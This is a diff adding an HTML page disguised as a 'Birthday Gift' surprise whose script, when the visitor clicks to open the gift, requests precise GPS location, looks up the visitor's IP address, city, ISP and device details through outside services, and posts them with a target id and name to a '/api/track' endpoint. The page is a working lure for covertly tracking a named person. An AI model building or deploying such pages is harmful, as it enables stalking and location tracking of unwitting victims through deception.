@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>🎁 Birthday Gift 🎂</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255,255,255,0.95);
+            border-radius: 30px;
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .gift-icon {
+            font-size: 90px;
+            cursor: pointer;
+            animation: bounce 1s ease infinite;
+            display: inline-block;
+            transition: transform 0.2s;
+        }
+        .gift-icon:hover {
+            transform: scale(1.1);
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        h1 {
+            color: #333;
+            margin: 20px 0 10px;
+            font-size: 28px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 25px;
+        }
+        button {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            padding: 14px 35px;
+            border-radius: 50px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: scale(1.02);
+        }
+        .loader {
+            display: none;
+            margin: 20px auto;
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #ff6b6b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            display: none;
+            color: white;
+            animation: slideUp 0.5s ease;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .message.show {
+            display: block;
+        }
+        .info-box {
+            background: #1a1a2e;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            text-align: left;
+            word-wrap: break-word;
+            display: none;
+        }
+        .info-box.show {
+            display: block;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="gift-icon" onclick="openGift()">🎁</div>
+    <h1>🎂 Happy Birthday! 🎉</h1>
+    <div class="subtitle">Someone has a special surprise for you!</div>
+    <button onclick="openGift()">🎁 OPEN YOUR GIFT 🎁</button>
+    <div class="loader" id="loader"></div>
+    <div class="message" id="message">
+        <h2>🎈 SURPRISE! 🎈</h2>
+        <p>May your day be filled with joy! ✨</p>
+        <p>🎂 HAPPY BIRTHDAY! 🎂</p>
+    </div>
+    <div class="info-box" id="infoBox">
+        <strong>📊 Information Captured:</strong><br>
+        <span id="infoText"></span>
+    </div>
+    <div class="footer">❤️ Made with love</div>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetId = urlParams.get('id') || 'unknown';
+    const targetName = urlParams.get('name') || 'Guest';
+    
+    let dataSent = false;
+    
+    async function openGift() {
+        if (dataSent) return;
+        
+        document.querySelector('.gift-icon').style.display = 'none';
+        document.querySelector('button').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        
+        // Collect data
+        let locationData = { lat: 'N/A', lon: 'N/A', accuracy: 'N/A' };
+        let networkData = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
+        let deviceData = {};
+        
+        // Get GPS location
+        try {
+            if (navigator.geolocation) {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    });
+                });
+                locationData = {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+            }
+        } catch(e) {
+            locationData = { lat: 'N/A', lon: 'N/A', accuracy: 'Blocked', error: e.message };
+        }
+        
+        // Get IP and network info
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const geoData = await geoRes.json();
+            networkData = {
+                ip: ipData.ip,
+                city: geoData.city || 'N/A',
+                region: geoData.region || 'N/A',
+                country: geoData.country_name || 'N/A',
+                isp: geoData.org || 'N/A'
+            };
+        } catch(e) {}
+        
+        // Device info
+        deviceData = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        
+        // Display info
+        const infoText = document.getElementById('infoText');
+        infoText.innerHTML = `
+🆔 ID: ${targetId}
+👤 Name: ${targetName}
+📍 Latitude: ${locationData.lat}
+📍 Longitude: ${locationData.lon}
+🎯 Accuracy: ${locationData.accuracy}m
+🌐 IP Address: ${networkData.ip}
+🏙️ City: ${networkData.city}
+🗺️ Region: ${networkData.region}
+🌍 Country: ${networkData.country}
+📡 ISP: ${networkData.isp}
+📱 Platform: ${deviceData.platform}
+🖥️ Screen: ${deviceData.screen}
+🌐 Language: ${deviceData.language}
+⏰ Timezone: ${deviceData.timezone}
+🕐 Time: ${new Date().toLocaleString()}
+        `;
+        
+        document.getElementById('infoBox').classList.add('show');
+        
+        // Send to backend API
+        try {
+            const response = await fetch('/api/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    id: targetId,
+                    name: targetName,
+                    location: locationData,
+                    network: networkData,
+                    device: deviceData,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            console.log('Data sent to server');
+        } catch(e) {
+            console.log('Server error:', e);
+        }
+        
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('message').classList.add('show');
+        }, 1000);
+        
+        dataSent = true;
+    }
+</script>
+</body>
+</html>
